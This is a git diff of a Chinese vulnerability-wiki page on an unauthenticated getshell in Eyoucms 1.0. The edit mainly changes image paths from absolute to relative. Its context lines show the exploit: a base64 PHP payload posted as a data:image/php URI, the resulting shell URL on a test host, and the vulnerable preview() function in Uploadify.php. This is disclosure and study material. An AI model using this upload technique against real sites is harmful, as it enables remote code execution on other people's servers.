@@ -18,26 +18,26 @@ Eyoucms 1.0 前台getshell
 
     构造: <?php phpinfo;
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.0前台getshell/media/rId24.png)
+![](./.resource/Eyoucms1.0前台getshell/media/rId24.png)
 
     post: data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.0前台getshell/media/rId25.png)
+![](./.resource/Eyoucms1.0前台getshell/media/rId25.png)
 
 Shell:
 http://test.eyoucms1.0.com/preview/ae85d74a721b0b8bd247bc31207a12e2.php
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.0前台getshell/media/rId26.png)
+![](./.resource/Eyoucms1.0前台getshell/media/rId26.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.0前台getshell/media/rId27.png)
+![](./.resource/Eyoucms1.0前台getshell/media/rId27.png)
 
 ### 原理分析
 
 漏洞文件： eyoucms1.0\\application\\api\\controller\\Uploadify.php漏洞函数：preview()
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.0前台getshell/media/rId29.png)
+![](./.resource/Eyoucms1.0前台getshell/media/rId29.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.0前台getshell/media/rId30.png)
+![](./.resource/Eyoucms1.0前台getshell/media/rId30.png)
 
 这里我将每行有意义的代码都解释了一下帮助读者进行查看。
 
